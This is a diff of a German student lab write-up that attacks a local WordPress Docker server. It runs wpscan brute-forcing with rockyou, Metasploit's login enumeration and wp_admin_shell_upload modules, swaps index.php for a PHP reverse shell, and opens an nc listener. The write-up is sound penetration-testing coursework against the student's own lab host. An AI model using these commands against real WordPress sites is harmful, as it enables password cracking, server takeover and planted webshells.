@@ -1,9 +1,11 @@
-# BS 3.5 
+# BS 3.5
 
-## Angabe: 
-Wordpress ist das weltweit am meisten verwendete CMS. Verwende das Metasploit-Framework, um in einen Webserver mit installiertem Wordpress einzudringen. Im ersten Schritt setzt du entweder unter Kali oder in einer eigenen VM mit docker-compose einen Wordpress-Server auf. Im zweiten Schritt führst du mit Metasploit einen Scan durch. Im dritten Schritt führst du eine Password-Attacke auf Wordpress mit wpscan durch. Im letzten Schritt bekommst du Zugang zum Server mithilfe einer "Reverse Shell". Mit Meterpreter kannst du jede Menge an Infos vom attackierten System herausfinden. 
+## Angabe
+
+Wordpress ist das weltweit am meisten verwendete CMS. Verwende das Metasploit-Framework, um in einen Webserver mit installiertem Wordpress einzudringen. Im ersten Schritt setzt du entweder unter Kali oder in einer eigenen VM mit docker-compose einen Wordpress-Server auf. Im zweiten Schritt führst du mit Metasploit einen Scan durch. Im dritten Schritt führst du eine Password-Attacke auf Wordpress mit wpscan durch. Im letzten Schritt bekommst du Zugang zum Server mithilfe einer "Reverse Shell". Mit Meterpreter kannst du jede Menge an Infos vom attackierten System herausfinden.
 
 In den Labornotizen findet man zum Schluss eine Schritt für Schritt Anleitung der Attacke.
+
 - Metasploit 2nd Edition, The Penetration Tester’s Guide, no starch press, 2025
 - Metasploit Penetration Testing Cookbook, Third Edition, Packt, 2018
 - https://docs.docker.com/compose/wordpress/
@@ -12,17 +14,15 @@ In den Labornotizen findet man zum Schluss eine Schritt für Schritt Anleitung d
 - https://www.hackingarticles.in/multiple-ways-to-crack-wordpress-login/
 - https://www.hackingarticles.in/wordpress-reverse-shell/
 
-
-
-
 ---
 
-## 1. Kali Linux Konfiguration:
+## 1. Kali Linux Konfiguration
 
-### 1.1 Docker installieren/aufsetzen: 
+### 1.1 Docker installieren/aufsetzen
 
-Prerequisites installieren: 
-```
+Prerequisites installieren:
+
+```bash
 sudo apt update
 sudo apt install -y docker.io
 sudo apt install docker-compose
@@ -33,7 +33,8 @@ mkdir ~/wp-docker
 Nachdem man Docker installiert hat muss man nun die **compose-docker.yml** anlegen und mit Inhalt zur Installation von Wordpress und MYSQL.
 
 **compose-docker.yml:**
-```
+
+```bash
 services:
   db:
     # MariaDB image supporting amd64 & arm64
@@ -72,12 +73,13 @@ volumes:
 
 ```
 
-Nach dem Anlegen der Datei muss man in das Verzeichnis navigieren und von dort aus dem command: 
+Nach dem Anlegen der Datei muss man in das Verzeichnis navigieren und von dort aus dem command:
 
-```
+```bash
 cd ~/wp-docker/
 sudo docker compose up -d
 ```
+
 Wenn der Command ausgeführt wurde dauert es ein wenig bis der Server verfügbar ist. 
 
 ![image](./IMAGES/Docker_wp_db_start.png)
@@ -96,12 +98,13 @@ Nachdem der Dialog abgeschlossen ist, ist die Website fertig zum verwenden/angre
 
 ## 2. Angriff mit Kali
 
-### 2.1 WPscan 
+### 2.1 WPscan
+
 - https://www.hackingarticles.in/multiple-ways-to-crack-wordpress-login/
 
 WPscan is a command-line tool which is used as a black box vulnerability scanner. It is commonly used by security professionals and bloggers to test the security of their website. WPscan comes pre-installed on the most security-based Linux distributions and it is also available as a plug-in.
 
-```
+```bash
 gunzip /usr/share/wordlists/rockyou.txt.gz 
 wpscan --url http://127.0.0.1:8080 -P /usr/share/wordlists/rockyou.txt
 ```
@@ -119,7 +122,7 @@ Da wir jetzt den Scan/Bruteforce attacke auf den Server ausgeführt haben, haben
 
 Mit diesem Modul von Metasploit ladet man ein maliziöses Plugin auf den Server, welches eine reverse shell payload beinhaltet. 
 
-```
+```bash
 use auxiliary/scanner/http/wordpress_login_enum
 set rhosts 127.0.0.1
 set rport 8080
@@ -134,9 +137,9 @@ exploit
 
 - https://www.hackingarticles.in/wordpress-reverse-shell/
 
-Um die Reverse Shell ausführen zu können braucht man die Credentials eines Admin Kontos! 
+Um die Reverse Shell ausführen zu können braucht man die Credentials eines Admin Kontos!
 
-```
+```bash
 use exploit/unix/webapp/wp_admin_shell_upload
 set USERNAME wp_user
 set PASSWORD cisco123
@@ -147,23 +150,23 @@ exploit
 
 ![image](./IMAGES/wp_exploit_rshell.png)
 
-Als nächstes kann man ja, da man die Credentials eines Admins hat, auf dem Management-panel im Browser das Plug-in "Advanced File Manager" installieren und dadurch die Konfig des index.php files bearbeiten und schadhaften Code einfügen. 
+Als nächstes kann man ja, da man die Credentials eines Admins hat, auf dem Management-panel im Browser das Plug-in "Advanced File Manager" installieren und dadurch die Konfig des index.php files bearbeiten und schadhaften Code einfügen.
 
-Da es das Plugin nicht gibt welches im Guide verwendet wurde, habe ich das File Manager Plug-in verwendet. 
+Da es das Plugin nicht gibt welches im Guide verwendet wurde, habe ich das File Manager Plug-in verwendet.
 
 ![image](./IMAGES/WP_Plugin.png)
 
-Anschließend muss das Plugin, dann aktiviert werden. 
+Anschließend muss das Plugin, dann aktiviert werden.
 
-Wenn man das Plug-in jetzt aktiviert hat kann man im Management-panel die Dateien des Wordpress Servers bearbeiten. Wir wollen das index.php file verändern welches unter html ist. 
+Wenn man das Plug-in jetzt aktiviert hat kann man im Management-panel die Dateien des Wordpress Servers bearbeiten. Wir wollen das index.php file verändern welches unter html ist.
 
 ![image](./IMAGES/WP_Files.png)
 
-Um jetzt das File zu verändern ums man auf das zuverändernde File rechtsklick drücken und dann kann man auf edit File -> Text area, das File ändern. 
+Um jetzt das File zu verändern ums man auf das zuverändernde File rechtsklick drücken und dann kann man auf edit File -> Text area, das File ändern.
 
-Um eine reverse shell verbindung herzustellen wollen wir diesen code in die index.php seite einfügen. Den Code in index.php wollen wir jetzt mit dem schadhaften code austauschen, der die reverse shell ermöglicht. Diesen Code finden wir unter **/usr/share/webshells/php/php-reverse-shell.php**: 
+Um eine reverse shell verbindung herzustellen wollen wir diesen code in die index.php seite einfügen. Den Code in index.php wollen wir jetzt mit dem schadhaften code austauschen, der die reverse shell ermöglicht. Diesen Code finden wir unter **/usr/share/webshells/php/php-reverse-shell.php**:
 
-```
+```bash
 [...]
 set_time_limit (0);
 $VERSION = "1.0";
@@ -180,4 +183,3 @@ $debug = 0;
 
 Wenn man die Index.php nun ausgetauscht hat kann man jetzt mit dem Command `sudo rlwrap nc -lvnp 1234`. Nachdem der Befehl ausgeführt wurde sollte sich eine shell öffnen. 
 ![image](./IMAGES/wp_rlwrap.png)
-
